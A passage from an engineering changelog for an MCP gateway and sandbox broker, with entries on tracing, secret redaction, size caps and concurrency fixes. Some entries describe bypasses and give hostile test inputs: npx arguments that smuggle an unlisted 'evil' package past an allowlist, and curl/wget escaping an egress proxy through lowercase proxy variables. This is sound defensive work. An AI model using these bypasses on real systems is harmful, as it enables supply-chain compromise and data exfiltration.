### CHG-0120 — internal (chat-pipeline) routes dropped the X-Request-ID correlation id (broken trace chain)
- **Date:** 2026-07-03
- **Scratchpad item:** G4 item 13 (monitoring/metrics/TRACING) — completes the CHG-0050/0051/0052 correlation-id residual for the internal routes.
- **Severity:** LOW (observability/tracing completeness — audit trail correlation, not a leak).
- **Files:** `gateway/ai_mesh_gateway/mcp_proxy.py` (`internal_tools_call`, `internal_discover_tools`, `_scan_internal_tools_list`); `gateway/ai_mesh_gateway/tests/test_mcp_internal_correlation_id.py` (new, 3 tests) + `test_mcp_inbound_redact_audit.py` (mock signature).
- **WHAT (gap):** CHG-0050/0051 made `org_mcp_jsonrpc` + the bare REST route propagate the inbound `X-Request-ID` into every MCPEvent AND the broker `_adapter_forward` hop (so a tool call traces gateway → broker → sandbox). But the INTERNAL (chat-pipeline) routes `internal_tools_call` + `internal_discover_tools` recorded ALL their audit events with NO `request_id` and called `_adapter_forward` with NO `correlation_id` — so a chat-pipeline tool call / tool-sync trace ENDED at the internal gateway boundary (the noted CHG-0050 residual: "thread _req_id into internal_tools_call"). Every internal audit event (inbound block/redact CHG-0109, sandbox+httpx result block/redact CHG-0105/0106, discovery metadata scan CHG-0108) was uncorrelated.
- **WHY:** Phase-3 tracing — a chat-originated MCP call must be traceable end-to-end (gateway audit ↔ broker log ↔ sandbox), like the org/REST paths; the internal routes were the last untraced hop.
- **NOW DOES:** both internal routes compute `_mcp_request_correlation_id(request, 1)` (prefers the inbound `X-Request-ID`, bounded; falls back to the JSON-RPC id) once at entry, thread it as `request_id=` into ALL their `_record_gateway_event` calls (incl. the nested `_scan_internal_result` closure + the `_scan_internal_tools_list` helper, which gained a `request_id` param), and pass it as `correlation_id=` to `_adapter_forward` (which already propagates it to the broker via `broker_send_rpc`, CHG-0051 → broker log, CHG-0052). Trace chain now continuous on the chat-pipeline path.
- **Touched whose work:** the owning-session internal routes; completes CHG-0050/0051/0052 (correlation-id propagation) for the internal path.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_internal_correlation_id.py -q` → 3 passed (internal_tools_call: every audit event + the adapter hop carry the `X-Request-ID`; internal_discover_tools: same; missing header → falls back to the JSON-RPC id "1", no crash). Full sweep `ai_mesh_gateway/tests` → 1756 passed, 0 failed; broker `-k "not websocket"` → 155 passed. **Byte-level:** with `X-Request-ID: trace-corr-99`, all internal audit `request_id` == `trace-corr-99` and `_adapter_forward(correlation_id=)` == `trace-corr-99`. **Oracle:** N/A — tracing-completeness fix, no PII-text egress delta. Evidence: `mcp-parallel/findings/backstop-p-internal-correlation-id/finding.md`.

### CHG-0121 — broker did not forward X-Request-ID to the sandbox AGENT (last trace hop); agent didn't log it
- **Date:** 2026-07-03
- **Scratchpad item:** G4 item 13 (monitoring/metrics/TRACING) — closes the CHG-0052 residual ("forward X-Request-ID to the sandbox AGENT + agent-log, last hop"). Completes the correlation-id chain begun by CHG-0050/0051/0052/0120.
- **Severity:** LOW (observability/tracing completeness — the last hop of the audit-trail correlation, not a leak).
- **Files:** `services/mcp-broker/src/sandbox/routes.py` (`_post_agent_rpc` + `_forward_sandbox_rpc` call site); `services/mcp-broker/sandbox-image/agent/main.py` (`/rpc` reads + logs `X-Request-ID`); `services/mcp-broker/tests/test_agent_ready_retry.py` (+2 tests, mock signature); `services/mcp-broker/sandbox-image/agent/tests/test_rpc_unified.py` (+1 test).
- **WHAT (gap):** CHG-0051/0052 propagate `X-Request-ID` gateway → broker and LOG it at the broker (`_forward_sandbox_rpc`), and CHG-0120 threads it through the internal gateway routes → the adapter. BUT the broker's `_post_agent_rpc` was called with NO `request_id` and did `client.post(url, json=payload)` with NO headers — so the correlation id NEVER reached the in-container sandbox AGENT, and the agent's `/rpc` handler neither read nor logged it. The trace chain BROKE at the broker → agent hop (gateway audit → broker log → **[break]** → sandbox agent) — the last untraced hop noted in the CHG-0052 residual.
- **WHY:** Phase-3 tracing — a tool call must be correlatable end-to-end including the in-container agent, so a per-call trace spans every process.
- **NOW DOES:** (1) `_forward_sandbox_rpc` passes its `request_id` to `_post_agent_rpc`, which forwards it as an `X-Request-ID` header on the agent POST (omitted entirely when absent — no spurious empty header). (2) the sandbox agent `/rpc` reads `X-Request-ID` (FastAPI `Header`) and logs ONE line at entry with SAFE metadata ONLY — org / server_slug / transport / method / jsonrpc_id / request_id, NEVER params/args/env/upstream (which can carry PII/secrets — mirrors the broker CHG-0052 log hygiene). The trace is now continuous gateway → broker → sandbox agent.
- **Touched whose work:** the broker sandbox RPC forward (`routes._post_agent_rpc`) + the in-container agent `/rpc` handler; completes CHG-0050/0051/0052/0120.
- **VERIFY:** `cd services/mcp-broker && PYTHONPATH=src ./.venv/bin/python -m pytest tests/test_agent_ready_retry.py -o asyncio_mode=auto -q` → 5 passed (forwards `{"X-Request-ID": "trace-agent-7"}`; no request_id → no header; + the 3 existing retry tests). Agent: `PYTHONPATH=…/shared:…/sandbox-image ./.venv/bin/python -m pytest sandbox-image/agent/tests/test_rpc_unified.py -o asyncio_mode=auto -q` → 7 passed (the new test asserts the agent logs `request_id=trace-agent-7` AND does NOT log the command/args). Full broker `tests -k "not websocket"` → 157 passed. Gateway unaffected. **Byte-level:** agent log = `agent rpc org=test-org server=srv transport=stdio method=tools/list jsonrpc_id=1 request_id=trace-agent-7` (no `npx`/`secret-pkg`/args). **Oracle:** N/A — tracing-completeness fix, no PII-text egress delta. Evidence: `mcp-parallel/findings/backstop-p-agent-correlation-id/finding.md`.

### CHG-0122 — finite SSE branch didn't scan interleaved server-pushed notifications (mid-call leak)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 — field-level redaction of tool RESULTS (byte-verified) on the SSE result surface; parity with the non-finite stream (CHG-0098).
...
- **WHAT (gap):** the ext-proxy FINITE SSE branch (tools/call / resources/* / prompts/* — buffered + scanned, CHG-0039/0064) called `_scan_reframe_sse_tool_result(...)` with the DEFAULT `scan_notifications=False`. A finite MCP call's SSE response can INTERLEAVE server-pushed notification frames (`notifications/progress`, `notifications/message`) BEFORE the final result; with `scan_notifications=False` those frames are re-emitted VERBATIM (the reframe scans only the result/error event, passing notification events through raw). So a secret / PII in a mid-call notification egressed to the client/LLM unredacted — while the NON-finite stream (`stream_gen`) already scanned notification params (CHG-0098). An asymmetry between the finite and non-finite SSE branches. Byte-verified: a `notifications/message` frame carrying `AKIAIOSFODNN7EXAMPLE` + `bob@corp.example` interleaved before a benign tools/call result egressed the secret + email raw.
- **WHY:** HARDEN 1.4 — ALL server-controlled SSE content on the untrusted external path must be scanned; the finite branch omitted the notification frames the non-finite branch already covers.
- **NOW DOES:** the finite SSE branch passes `scan_notifications=True` to `_scan_reframe_sse_tool_result`, so interleaved notification `params` are scanned (masked / fail-closed withheld) via the same result floor as the final result — parity with the non-finite stream. The result frame is still delivered; benign notifications pass through.
- **Touched whose work:** the owning-session `ext_mcp_proxy` finite SSE branch (parity with the CHG-0098 non-finite stream; extends CHG-0039/0064).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_bare_proxy_scan.py -q -k sse` → 12 passed (new `test_ext_finite_sse_scans_interleaved_notification`: the interleaved notification secret + email are masked, the result frame still delivered). Full sweep `ai_mesh_gateway/tests` → 1777 passed, 0 failed; broker unaffected (gateway-only). **Byte-level:** a finite tools/call SSE with a leading `notifications/message` `{"data":"key AKIAIOSFODNN7EXAMPLE email bob@corp.example"}` → the secret + email are absent from the re-emitted SSE. **Independent oracle (aidefence):** `has_pii` **true** on the raw notification frame, **false** on the masked. Evidence: `mcp-parallel/findings/backstop-p-finite-sse-notification-scan/finding.md`.

### CHG-0123 — internal (chat-pipeline) streamable-http SSE branch parsed per-LINE: returned a leading notification / dropped multi-line results
- **Date:** 2026-07-03
- **Scratchpad item:** correctness/robustness parity — the last SSE surface still using a naive per-line split (org SSE = CHG-0093, ext finite SSE = CHG-0122 already reassemble per-event).
- **Severity:** LOW (correctness/robustness — NOT a new leak: whatever is returned is still floor-scanned by `_scan_internal_result`, and a split secret fails safe to empty. The bug returned the WRONG frame or dropped the result).
...
- **WHAT (gap):** the legacy internal streamable-http SSE branch (reached only with `MCP_HTTP_VIA_SANDBOX=0` — the direct-httpx internal path; streamable-http is sandbox-routed by default) parsed the SSE response PER LINE: `for line in call_resp.text.split("\n"): if line.startswith("data:"): return _scan_internal_result(json.loads(data_str))`. Two robustness bugs: (a) a server-pushed NOTIFICATION frame (`notifications/progress`, `notifications/message`) that arrives BEFORE the result frame would be returned as the response — the actual tool result is lost and a notification is surfaced to the chat pipeline (WRONG response); (b) a multi-line-`data:` result (data fields split across several `data:` lines per the SSE spec) failed `json.loads` on each partial line → the whole result was dropped → "Empty SSE response from upstream tools/call". Byte-probed both: `[notif-first] result returned: False, returns notification: True`; `[multi-line] result returned: False, Empty SSE: True`.
- **WHY:** correctness + robustness parity — the org SSE reframe (`_scan_reframe_sse_tool_result`, CHG-0093) and the ext finite SSE branch (CHG-0122) already reassemble each event's `data:` fields and select the result/error event; the internal legacy branch was the last SSE surface still using a naive per-line split.
- **NOW DOES:** parses PER EVENT (`split("\n\n")`), reassembles each event's `data:` fields joined by `"\n"` (SSE spec), prefers the event carrying `result`/`error` (falls back to the first parseable event), skips notification events; the chosen result/error is floor-scanned via `_scan_internal_result` before egress. A notification event is never returned (it is not the tool response, so it never reaches the chat pipeline). Post-fix byte-probe: `[notif-first] result returned: True, notif NOT returned: True`; `[multi-line] result returned: True`; `[secret in result] masked: True`; `[benign single] result returned: True`.
- **Touched whose work:** the owning-session `internal_tools_call` streamable-http branch (parity with org CHG-0093 + ext CHG-0122). Independent of the mcp-page session's in-flight CLEANUP-06 (SSRF error sanitization) which shares the same file — that change is left UNCOMMITTED in the working tree for that session; only this CHG-0123 hunk was staged (via `git apply --cached` of the isolated hunk) so their work is neither committed nor destroyed.
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_internal_http_result_scan.py -q` → 8 passed (3 new CHG-0123: `test_sse_returns_result_not_leading_notification` — the RESULT event is returned, the leading notification is NOT; `test_sse_reassembles_multiline_data_result` — multi-line data reassembled, not dropped; `test_sse_result_secret_still_masked` — `AKIAIOSFODNN7EXAMPLE` in the returned result is still floor-scanned/masked). NOTE: the 2 failures in `test_mcp_bare_proxy_scan.py` (`test_ext_proxy_ssrf_guard_*`) in a full-suite run are the mcp-page session's IN-FLIGHT CLEANUP-06 (they assert the old raw-SSRF-reason contract, now sanitized by `sanitize_mcp_error`); they PASS on clean HEAD and are independent of this change (different function `ext_mcp_proxy`) — left for that session to reconcile with its own tests. Evidence: `mcp-parallel/findings/backstop-p-internal-sse-event-reassembly/finding.md`.

### CHG-0124 — regression-lock: chat-path (internal_tools_call) disabled-tool authz never forwards/executes
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN 1.4 — per-user/agent/role tool authorization, chat-pipeline surface (rigorous-verification of the actor-keyed authz model; lock in the invariant).
- **Severity:** LOW (test-only regression-lock — NO production code change).
- **Files:** `gateway/ai_mesh_gateway/tests/test_mcp_internal_http_result_scan.py` (+2 tests, +1 driver). No `mcp_proxy.py` change.
- **WHAT (gap):** two tool-call authz models coexist by design — the direct-MCP path enforces the per-API-key `mcp_allowed_tools` allowlist (`_tool_allowed_by_key`, CHG-0006/0038), and the chat-pipeline path (`internal_tools_call`, called by control-plane `MCPToolCallView` over an internal key with NO end-user API key) enforces the org-level enabled/disabled set: it blocks a disabled tool near the top of the handler (`_is_tool_disabled` → `-32000 "Tool is disabled for this server"`, mcp_proxy.py L2701) BEFORE any upstream forward, then runs the full 1.4 chain. VERIFIED sound (read the handler + the control-plane caller payload at views.py L834 — no actor allowlist in the payload, confirming per-key allowlist is intentionally direct-path-only; no live bypass). BUT the disabled-block was only UNIT-covered (`_is_tool_disabled` + enabled-tools cache) — NO end-to-end test proved `internal_tools_call` short-circuits EXECUTION (never forwards on either the sandbox `_adapter_forward` path or the legacy httpx path → no egress). With many parallel sessions churning mcp_proxy.py, a reorder/removal of the disabled check would be a real 1.4/authz regression no test would catch.
- **WHY:** lock in the chat-path tool-authz + no-egress invariant so parallel churn can't silently regress it.
- **NOW DOES:** `test_internal_disabled_tool_blocked_and_not_forwarded` drives real `internal_tools_call` with a disabled tool and asserts (1) JSON-RPC `-32000` + "is disabled for this server"; (2) SECURITY INVARIANT `_adapter_forward.call_count == 0` AND httpx `client.post.call_count == 0` → the tool never executed → no egress. `test_internal_enabled_tool_is_forwarded_control` (legacy path) asserts `client.post.call_count >= 1` so the no-forward assertion is not vacuous.
- **Touched whose work:** locks in an invariant of the owning-session `internal_tools_call`; guards against parallel-session regressions in mcp_proxy.py. Complements CHG-0006/0038 (direct-path allowlist).
- **VERIFY:** `cd gateway && ./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_internal_http_result_scan.py -q` → 10 passed; full sweep `ai_mesh_gateway/tests` → 1787 passed, 0 failed. Test-only; no behavior change. NOTE: the disabled check is a policy control (fail-OPEN on enabled-tools lookup failure by deliberate availability design); the leak floor (result scan/redact) is separately fail-CLOSED. Evidence: `mcp-parallel/findings/backstop-p-chat-path-disabled-tool-authz-lock/finding.md`.

### CHG-0125 — egress-lockdown bypass: proxy env set uppercase-only (curl/wget/git escape the proxy)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — egress-lockdown (item 12 dimension). A sandbox's outbound traffic must funnel through the egress proxy (the outbound-allowlist enforcement point).
- **Severity:** MEDIUM (architecture — egress-lockdown guardrail bypass → exfiltration path; latent, only on the `MCP_SANDBOX_EGRESS_LOCKDOWN=true` / explicit-proxy path).
- **Files:** `services/mcp-broker/src/sandbox/docker_manager.py` (`_egress_proxy_env`); `services/mcp-broker/tests/test_sandbox_lifecycle.py` (extend egress test + new lockdown-off negative test).
- **WHAT (gap):** `_egress_proxy_env` injected the proxy into the sandbox container with ONLY the UPPERCASE vars (`HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY`). curl honors ONLY lowercase `http_proxy` for plain HTTP (deliberate curl behavior since httpoxy/CVE-2016-5385 — man page: "http_proxy is only used in lowercase"); wget/git prefer lowercase too. So a sandboxed MCP server (or subprocess) shelling out to curl/wget/git would BYPASS the egress proxy and connect directly to arbitrary hosts over the org bridge NAT even under `MCP_SANDBOX_EGRESS_LOCKDOWN=true` — a data-exfil channel that defeats the guardrail + escapes the proxy allowlist.
- **WHY:** the egress proxy is the outbound enforcement point; the env-var injection must cover the tools that actually make outbound calls.
- **NOW DOES:** `_egress_proxy_env` emits BOTH upper- and lower-case variants (`HTTP_PROXY`+`http_proxy`, etc.) — the standard defensive convention — so curl/wget/git + case-sensitive libs all route through the proxy. The `{}`-when-disabled fast path is preserved.
- **Touched whose work:** the owning-session broker sandbox egress config. Gateway/control unaffected.
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_sandbox_lifecycle.py -q -k "egress or proxy"` → 2 passed; full broker `tests -k "not websocket"` → 158 passed. `_egress_proxy_env` is the ONLY proxy-env source (grep-verified across broker/sandbox-image/gateway). NOTE (honesty): this closes the SOFT (env) bypass for proxy-respecting tools; a HARD network lockdown (internal net + forced/transparent proxy or iptables egress) remains an INFRA task (unchanged); egress-lockdown is OFF by default. Evidence: `mcp-parallel/findings/backstop-p-egress-proxy-lowercase-bypass/finding.md`.

### CHG-0126 — stdio package allowlist/pinning bypass: `--flag=value` form + 2nd package flag skipped the check
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — no unknown npm on host / on-demand package allowlist (item 8) + pinned fetches (N2/N3).
- **Severity:** MEDIUM (supply-chain — unlisted/unpinned npm/PyPI package fetched+run past the allowlist on BOTH the sandbox agent and the shared gateway HOST; latent unless the allowlist/pinned env is set).
- **Files:** `services/mcp-broker/sandbox-image/agent/stdio_manager.py` + `tests/test_stdio_manager_packages.py` (+8); `gateway/ai_mesh_gateway/mcp_stdio_adapter.py` + `tests/test_mcp_stdio_adapter_package_gating.py` (new, +7). Both adapters (parity — meant to be identical).
- **WHAT (gap):** both adapters extracted the package spec with a single-spec, SPACE-only parser (`if tok in ("--from","--with","--package","-p"): return next(it)`). Two bypasses: (1) the `--flag=value` form (`npx --package=evil safe-cmd`) — the token startswith("-") so it's skipped as a generic flag, and extraction returns the trailing COMMAND token → the allowlist/pinned check runs against the wrong name while npx fetches `evil`; (2) a 2nd package flag (`npx -p allowed -p evil cmd`) — only the first is checked, `evil` rides in. Result: an unlisted/unpinned package is pulled from npm/PyPI and executed — in the sandbox AND (via mcp_stdio_adapter) on the shared gateway host.
- **WHY:** the on-demand allowlist + pinned-version policy are the "no unknown npm on host" supply-chain controls; they must check EVERY package the invocation fetches, in both flag forms.
- **NOW DOES:** `_extract_package_specs` (plural) returns every fetched spec — both `--flag value` and `--flag=value` for all of --from/--with/--package/-p, all package flags, and the bare positional ONLY when no package flag supplied one (a package flag makes the positional the COMMAND, not a package, so it's not mis-checked). Enforcement loops over every spec (allowlist + pinned). Thin `_extract_package_spec` wrapper preserves the helper API.
- **Touched whose work:** the owning-session stdio package-gating (CHG-0022 N2/N3), both adapters for parity.
- **VERIFY:** agent `tests/test_stdio_manager_packages.py` → 41 passed, full agent suite → 75 passed; gateway `test_mcp_stdio_adapter_package_gating.py` → 7 passed, full gateway → 1794 passed, 0 failed. New tests: `--package=evil safe-cmd`→["evil"]; `-p a -p evil cmd`→["a","evil"]; `-p realpkg runcmd`→["realpkg"] (command not mis-classified) + end-to-end block. NOTE: controls OFF by default (opt-in); this makes them actually enforce when enabled. Evidence: `mcp-parallel/findings/backstop-p-stdio-package-allowlist-bypass/finding.md`.

### CHG-0127 — reaper TOCTOU: an idle sandbox reactivated mid-sweep was still reaped (dropped its in-flight call)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — reaper correctness under soak/concurrency (stress items 15/16/18: none dropped, reaper correct, no leakage during recovery).
- **Severity:** MEDIUM (soak/concurrency correctness — the idle reaper could stop a sandbox a concurrent request just reactivated, dropping that request's in-flight tool call + forcing re-provision).
- **Files:** `services/mcp-broker/src/sandbox/reaper.py` (`reap_idle_sandboxes`); `services/mcp-broker/src/sandbox/registry.py` (new `is_idle`); `services/mcp-broker/tests/test_sandbox_reaper.py` (+2).
- **WHAT (gap):** `reap_idle_sandboxes` snapshotted the idle set ONCE (`idle_entries`, T0), then stopped entries one-by-one with `await asyncio.to_thread(docker_manager.stop, ...)`. Each await yields the loop, so a multi-entry sweep stops the last entry long after T0. During any await, a request via `_forward_sandbox_rpc` calls `touch_activity` → `registry.touch`, REACTIVATING the sandbox — but the reaper stopped it on the STALE T0 snapshot and removed it, so the in-flight request was forwarded to a container being concurrently stopped → dropped call + re-provision. A real intermittent failure under peak load.
- **WHY:** the reaper must not race live traffic; a sandbox that became active after the snapshot must not be reaped.
- **NOW DOES:** new locked `SandboxRegistry.is_idle(org_slug, idle_timeout, now=None)` single-entry re-check; `reap_idle_sandboxes` re-checks it immediately before stopping EACH entry and SKIPS any reactivated since the snapshot. In prod (`now=None`) it reads a FRESH clock so a post-snapshot touch is seen. Collapses the race window from the whole sweep to a single stop; genuinely-idle sandboxes still reaped; item-#24 per-entry error isolation unchanged.
- **Touched whose work:** owning-session broker reaper + registry (item #24 lineage).
- **VERIFY:** `cd services/mcp-broker && ./.venv/bin/python -m pytest tests/test_sandbox_reaper.py -q` → 12 passed; full broker `tests -k "not websocket"` → 160 passed. `test_reaper_skips_sandbox_reactivated_mid_sweep` drives the real race (mocked stop("a") touches "b"; reaper reaps "a", SKIPS "b", stop called for "a" only, "b" kept). NOTE: a residual micro-window between the re-check and the stop call remains (rarer; would need a "reaping" flag + re-provision-on-conflict). Evidence: `mcp-parallel/findings/backstop-p-reaper-toctou-reactivated-sandbox/finding.md`.

### CHG-0128 — in-sandbox SSE reader buffered an untrusted upstream event with no size cap (OOM/mem-bomb)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — resource-bomb containment (stress item 17); bound untrusted upstream reads (parity CHG-0066/0117).
- **Severity:** MEDIUM (a malicious/broken upstream MCP server could OOM the sandbox agent by streaming unbounded data: lines in one SSE event; the crash takes down ALL of that org's servers in the shared sandbox — a within-tenant availability bomb).
- **Files:** `services/mcp-broker/sandbox-image/agent/sse_manager.py` (`_sse_reader_loop`); `services/mcp-broker/sandbox-image/agent/tests/test_sse_reader_bounds.py` (new, +3).
- **WHAT (gap):** `_sse_reader_loop` (legacy HTTP+SSE transport; long-lived GET /sse to the untrusted third-party server) accumulated every `data:` line of an event into `data_lines` with NO size cap, joining on the terminating blank line. An upstream that streams millions of (or very large) `data:` lines WITHOUT the blank line grows `data_lines` until the agent hits its cgroup mem_limit and is OOM-killed. The sibling read paths were already bounded (streamable-http per-response CHG-0066, gateway ext-SSE CHG-0117, WS per-message cap) — this in-sandbox SSE reader was not.
- **WHY:** untrusted upstream reads must be bounded so a resource bomb is contained without crashing the sandbox (which drops the org's other MCP servers).
- **NOW DOES:** tracks accumulated `data_bytes`; when it would exceed `_MAX_RESPONSE_BYTES` (8MB, env MCP_AGENT_MAX_RESPONSE_BYTES) it DROPS the oversized event and sets a `skipping` flag that discards the rest of that event until its blank line, then resumes for the next event. Legitimate events (incl. multi-line data under the cap) unchanged; the reader keeps running.
- **Touched whose work:** owning-session in-sandbox agent SSE upstream reader.
- **VERIFY:** `cd services/mcp-broker/sandbox-image/agent && ../../.venv/bin/python -m pytest tests/test_sse_reader_bounds.py -q` → 3 passed; `tests/test_upstream_proxy.py` → 18 passed (SSE path unbroken); full agent suite green. New tests: normal event delivered; oversized event DROPPED + a subsequent normal event still delivered (reader survives); multi-line data under cap still joined+parsed. RESIDUALS (noted, deferred): (1) a single huge unterminated line still buffers inside httpx aiter_lines (needs aiter_bytes line-splitter); (2) the sse_responses asyncio.Queue is unbounded (needs drop/backpressure). Evidence: `mcp-parallel/findings/backstop-p-agent-sse-reader-unbounded-event/finding.md`.

### CHG-0129 — in-sandbox SSE response queue was unbounded (unsolicited-event flood OOM)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — resource-bomb containment; closes residual #2 of CHG-0128 (parity CHG-0066/0117).
- **Severity:** MEDIUM (a malicious/broken upstream flooding UNSOLICITED message events could grow the per-session response queue unbounded → OOM the sandbox agent → drops ALL the org's servers in the shared sandbox).
- **Files:** `services/mcp-broker/sandbox-image/agent/sse_manager.py` (`_new_sse_queue`, `_bounded_put`, both queue creations + producer); `services/mcp-broker/sandbox-image/agent/tests/test_sse_reader_bounds.py` (+2).
- **WHAT (gap):** `session.sse_responses` was an unbounded `asyncio.Queue()`. The SSE reader is a PERSISTENT background task that `put()`s every upstream message-event onto it, but the consumer (`send_sse_jsonrpc`) only drains WHILE an RPC is in flight (id-matched, non-matching discarded). An untrusted upstream flooding UNSOLICITED message events while NO RPC is active (nobody draining) grows the queue without bound → agent OOM. This is residual #2 from CHG-0128.
- **WHY:** untrusted-upstream buffers must be bounded so a flood is contained without crashing the sandbox.
- **NOW DOES:** `_new_sse_queue()` creates the queue with `maxsize=_SSE_QUEUE_MAXSIZE` (default 1024, floor 16, env MCP_AGENT_SSE_QUEUE_MAXSIZE); `_bounded_put` replaces the producer `await put()` — put_nowait, and on QueueFull EVICTS the oldest then puts (atomic, keeps the freshest, NEVER blocks the reader). A waiting consumer get() receives the item directly (never counts against maxsize) so normal RPC delivery is unchanged — the bound only engages on the flood case.
- **Touched whose work:** owning-session in-sandbox agent SSE reader (follows CHG-0128).
- **VERIFY:** `cd services/mcp-broker/sandbox-image/agent && ../../.venv/bin/python -m pytest tests/test_sse_reader_bounds.py -q` → 5 passed (3 CHG-0128 + 2 CHG-0129); `tests/test_upstream_proxy.py` → SSE RPC path unbroken; full agent suite green. New tests: `_bounded_put` drops oldest when full (retains newest); a 50-event unsolicited flood with no consumer keeps qsize<=maxsize and retains the freshest ids. RESIDUAL still open: single huge unterminated line via httpx aiter_lines (needs aiter_bytes splitter). Evidence: `mcp-parallel/findings/backstop-p-agent-sse-response-queue-unbounded/finding.md`.

### CHG-0130 — SSE readers buffered a single unterminated line with no cap (httpx aiter_lines OOM)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — resource-bomb containment; closes the LAST residual of CHG-0128/0129 (parity CHG-0066/0117).
- **Severity:** MEDIUM (an upstream sending one enormous line with NO newline could OOM the sandbox agent BEFORE the CHG-0128 per-event cap / CHG-0129 queue bound could act — inside httpx aiter_lines, before the line is yielded).
- **Files:** `services/mcp-broker/sandbox-image/agent/upstream_manager.py` (new `_aiter_sse_lines_bounded`; `_post_streamable_http` SSE branch); `services/mcp-broker/sandbox-image/agent/sse_manager.py` (`_sse_reader_loop`); tests `test_sse_reader_bounds.py` (+1) + `test_upstream_proxy.py` (fakes yield bytes).
- **WHAT (gap):** both SSE read paths iterated `response.aiter_lines()` — `_sse_reader_loop` (legacy HTTP+SSE) and `_post_streamable_http` (streamable-http reply over text/event-stream). httpx aiter_lines() accumulates into an internal LineDecoder buffer until a line boundary with NO size cap, so an untrusted upstream sending one huge line with no newline OOMs the agent INSIDE aiter_lines (before the line is yielded) — the CHG-0128 per-event cap + CHG-0129 queue bound act only AFTER a line is yielded, so they can't help. Residual #1 from CHG-0128/0129.
- **WHY:** untrusted-upstream reads must bound the pending-line buffer too, not just post-line accumulation.
- **NOW DOES:** shared `_aiter_sse_lines_bounded(response, max_line_bytes)` reads via aiter_bytes(), splits on `\n` (strips trailing `\r`), yields lines, and RAISES `UpstreamError("upstream SSE line too large")` as soon as an UNTERMINATED buffer would exceed `_MAX_RESPONSE_BYTES` (8MB) → buffer bounded to ~one line's cap. Both paths use it (reader task ends → next RPC restarts it; streamable-http surfaces the error). Well-formed single/multi-line events parse as before.
- **Touched whose work:** owning-session in-sandbox agent SSE read paths (both).
- **VERIFY:** `cd services/mcp-broker/sandbox-image/agent && ../../.venv/bin/python -m pytest tests/test_sse_reader_bounds.py -q` → 6 passed (new `test_single_unterminated_huge_line_is_bounded`: raises "line too large" not OOM); `tests/test_upstream_proxy.py` → 18 passed (both SSE paths green with fakes migrated to aiter_bytes); full agent suite green. Completes the SSE-reader triad (CHG-0128 per-event / CHG-0129 queue / CHG-0130 per-line). Evidence: `mcp-parallel/findings/backstop-p-agent-sse-unbounded-line/finding.md`.

### CHG-0131 — ws transport silently enforced the websockets 1 MiB default, ignoring _MAX_RESPONSE_BYTES
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — consistent per-transport response-size enforcement (parity with http/sse/stdio _MAX_RESPONSE_BYTES caps).
- **Severity:** LOW-MEDIUM (correctness + policy-enforcement consistency: a raised cap was ignored on ws — legit 1-8 MiB responses failed — and a LOWERED operator cap was UNDER-ENFORCED, ws still accepting up to 1 MiB).
- **Files:** `services/mcp-broker/sandbox-image/agent/ws_manager.py` (`ensure_ws_connected`); `services/mcp-broker/sandbox-image/agent/tests/test_upstream_proxy.py` (+1).
- **WHAT (gap):** `ensure_ws_connected` called `websockets.connect(url, additional_headers=..., open_timeout=...)` with NO `max_size`, so websockets 16.0 applied its default max_size=1 MiB (1048576) — silently overriding the agent's `_MAX_RESPONSE_BYTES` (8 MiB default, MCP_AGENT_MAX_RESPONSE_BYTES) on the ws transport ONLY. (1) ws messages 1-8 MiB were rejected by the library (PayloadTooBig -> connection-closed) though policy allowed them; (2) the explicit `if len(raw) > _MAX_RESPONSE_BYTES` post-recv check was DEAD CODE (library rejected >1 MiB before recv returned); (3) a LOWERED operator cap (<1 MiB) was not enforced on ws (still allowed up to 1 MiB).
- **WHY:** every transport must honor the agent's configured response cap consistently; the ws library default silently diverged.
- **NOW DOES:** passes `max_size=_MAX_RESPONSE_BYTES` to `websockets.connect()` — the library enforces the agent's configured cap (same as other transports) and does so BEFORE buffering the whole frame (real pre-buffer OOM guard). The explicit length check remains belt-and-suspenders.
- **Touched whose work:** owning-session in-sandbox agent WebSocket upstream proxy.
- **VERIFY:** `cd services/mcp-broker/sandbox-image/agent && ../../.venv/bin/python -m pytest tests/test_upstream_proxy.py -q -k "websocket or ws_connect"` (ws tests pass); full agent suite green. New `test_ws_connect_enforces_response_cap_via_max_size` asserts connect is called with max_size==_MAX_RESPONSE_BYTES. Confirmed websockets 16.0 connect() default max_size=1048576 (1 MiB) vs agent 8 MiB. Evidence: `mcp-parallel/findings/backstop-p-ws-max-size-cap-mismatch/finding.md`.

### CHG-0132 — proxy_chat rate-limit leaked no-TTL Redis keys (CHG-0062 fix missed the chat hot path)
- **Date:** 2026-07-03
- **Scratchpad item:** HARDEN THE ARCHITECTURE — PostgreSQL + Redis correctness / gateway rate-limit correctness (item 9/11); parity with CHG-0062.
- **Severity:** MEDIUM (Redis correctness + resource exhaustion under soak/stress — orphaned no-TTL burst keys accumulate ~1/second → unbounded Redis growth → eventual OOM breaks rate limiting for all orgs).
- **Files:** `gateway/ai_mesh_gateway/main.py` (`proxy_chat` inline burst + RPM counters); `gateway/ai_mesh_gateway/tests/test_proxy_chat_ratelimit_atomic_ttl.py` (new, +2 guards).
